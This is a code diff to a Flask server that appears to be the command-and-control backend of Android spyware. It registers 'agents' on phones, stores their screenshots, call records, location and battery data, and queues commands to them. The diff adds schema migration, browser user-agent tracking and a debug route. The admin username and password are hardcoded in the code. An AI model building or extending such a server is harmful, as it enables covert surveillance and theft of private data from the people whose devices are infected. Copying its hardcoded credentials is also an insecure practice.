@@ -14,31 +14,52 @@ app.template_folder = 'templates'
 ADMIN_USERNAME = "Mpc"
 ADMIN_PASSWORD = "0220Mpc"
 
-# Initialize database
+# Initialize database with migration support
 def init_database():
     conn = sqlite3.connect('mp_agent.db')
     cursor = conn.cursor()
     
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS agents (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            agent_id TEXT UNIQUE NOT NULL,
-            phone_model TEXT,
-            android_version TEXT,
-            ip_address TEXT,
-            status TEXT DEFAULT 'active',
-            first_seen DATETIME,
-            last_seen DATETIME,
-            screenshot_count INTEGER DEFAULT 0,
-            call_records INTEGER DEFAULT 0,
-            location_data TEXT,
-            battery_level INTEGER,
-            last_screenshot DATETIME,
-            user_agent TEXT,
-            browser_info TEXT
-        )
-    ''')
+    # Check if agents table exists and get its columns
+    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='agents'")
+    table_exists = cursor.fetchone()
     
+    if table_exists:
+        # Get current columns
+        cursor.execute("PRAGMA table_info(agents)")
+        existing_columns = [column[1] for column in cursor.fetchall()]
+        
+        # Add missing columns
+        if 'user_agent' not in existing_columns:
+            cursor.execute("ALTER TABLE agents ADD COLUMN user_agent TEXT")
+            print("✅ Added user_agent column to agents table")
+        
+        if 'browser_info' not in existing_columns:
+            cursor.execute("ALTER TABLE agents ADD COLUMN browser_info TEXT")
+            print("✅ Added browser_info column to agents table")
+    else:
+        # Create fresh agents table
+        cursor.execute('''
+            CREATE TABLE agents (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                agent_id TEXT UNIQUE NOT NULL,
+                phone_model TEXT,
+                android_version TEXT,
+                ip_address TEXT,
+                status TEXT DEFAULT 'active',
+                first_seen DATETIME,
+                last_seen DATETIME,
+                screenshot_count INTEGER DEFAULT 0,
+                call_records INTEGER DEFAULT 0,
+                location_data TEXT,
+                battery_level INTEGER,
+                last_screenshot DATETIME,
+                user_agent TEXT,
+                browser_info TEXT
+            )
+        ''')
+        print("✅ Created fresh agents table")
+    
+    # Create other tables if they don't exist
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS screenshots (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -106,6 +127,7 @@ def init_database():
     
     conn.commit()
     conn.close()
+    print("✅ Database initialization completed")
 
 def get_db_connection():
     conn = sqlite3.connect('mp_agent.db')
@@ -143,6 +165,7 @@ def debug_agents():
             <strong>Agent ID:</strong> {agent['agent_id']}<br>
             <strong>Status:</strong> {agent['status']}<br>
             <strong>Phone Model:</strong> {agent['phone_model']}<br>
+            <strong>User Agent:</strong> {agent.get('user_agent', 'N/A')}<br>
             <strong>Last Seen:</strong> {agent['last_seen']}<br>
             <strong>First Seen:</strong> {agent['first_seen']}<br>
         </div>
@@ -161,6 +184,15 @@ def reset_agents():
     conn.close()
     
     return "All agents cleared. <a href='/debug/agents'>Check agents</a>"
+
+@app.route('/debug/fix_database')
+def fix_database():
+    """Force database schema update"""
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    init_database()
+    return "Database schema updated. <a href='/debug/agents'>Check agents</a>"
 
 # ==================== ADMIN DASHBOARD ROUTES ====================
 
@@ -188,7 +220,8 @@ def dashboard():
         'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
         'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
         'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
-        'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
+        'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0],
+        'web_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE user_agent LIKE '%Mozilla%'").fetchone()[0]
     }
     
     # Get recent data - Convert rows to dictionaries
@@ -228,7 +261,8 @@ def admin_dashboard():
         'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
         'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
         'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0],
-        'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
+        'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0],
+        'web_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE user_agent LIKE '%Mozilla%'").fetchone()[0]
     }
     
     # Get recent data - Convert rows to dictionaries
@@ -366,20 +400,39 @@ def register_agent():
         
         if existing_agent:
             print(f"🔄 Updating existing agent: {agent_id}")
-            conn.execute('''
-                UPDATE agents SET 
-                phone_model = ?, android_version = ?, ip_address = ?, user_agent = ?,
-                status = 'active', last_seen = ?
-                WHERE agent_id = ?
-            ''', (phone_model, android_version, ip_address, user_agent, current_time, agent_id))
+            # Try with new schema first
+            try:
+                conn.execute('''
+                    UPDATE agents SET 
+                    phone_model = ?, android_version = ?, ip_address = ?, user_agent = ?,
+                    status = 'active', last_seen = ?
+                    WHERE agent_id = ?
+                ''', (phone_model, android_version, ip_address, user_agent, current_time, agent_id))
+            except sqlite3.OperationalError:
+                # Fallback for old schema
+                conn.execute('''
+                    UPDATE agents SET 
+                    phone_model = ?, android_version = ?, ip_address = ?,
+                    status = 'active', last_seen = ?
+                    WHERE agent_id = ?
+                ''', (phone_model, android_version, ip_address, current_time, agent_id))
             action = "updated"
         else:
             print(f"🆕 Registering new agent: {agent_id}")
-            conn.execute('''
-                INSERT INTO agents 
-                (agent_id, phone_model, android_version, ip_address, user_agent, status, first_seen, last_seen)
-                VALUES (?, ?, ?, ?, ?, 'active', ?, ?)
-            ''', (agent_id, phone_model, android_version, ip_address, user_agent, current_time, current_time))
+            # Try with new schema first
+            try:
+                conn.execute('''
+                    INSERT INTO agents 
+                    (agent_id, phone_model, android_version, ip_address, user_agent, status, first_seen, last_seen)
+                    VALUES (?, ?, ?, ?, ?, 'active', ?, ?)
+                ''', (agent_id, phone_model, android_version, ip_address, user_agent, current_time, current_time))
+            except sqlite3.OperationalError:
+                # Fallback for old schema
+                conn.execute('''
+                    INSERT INTO agents 
+                    (agent_id, phone_model, android_version, ip_address, status, first_seen, last_seen)
+                    VALUES (?, ?, ?, ?, 'active', ?, ?)
+                ''', (agent_id, phone_model, android_version, ip_address, current_time, current_time))
             action = "registered"
         
         conn.commit()
